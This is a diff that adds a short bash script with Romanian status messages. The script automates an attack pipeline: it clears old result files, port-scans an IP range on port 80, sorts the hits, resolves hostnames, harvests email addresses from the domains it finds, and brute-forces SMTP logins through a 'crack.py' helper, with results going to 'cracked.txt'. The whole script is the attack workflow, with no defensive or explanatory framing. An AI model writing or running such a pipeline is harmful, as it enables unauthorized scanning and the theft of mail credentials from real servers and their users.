@@ -1,0 +1,16 @@
+#!/bin/bash
+
+rm -rf bios.txt ips.txt domains.txt bads.txt cracked.txt hm.txt
+echo "adunam ipuri"
+./ss 80 -b $1 -i eth0 -s 10
+sleep 3
+echo "sortam ipurile"
+cat bios.txt | sort | uniq > ips.txt
+echo "facem hosturile"
+python url.py 50
+echo "scoatem emailuri"
+python mail.py 50 domains.txt 
+echo "cracking smtps"
+python crack.py emails.txt 400 0
+
+
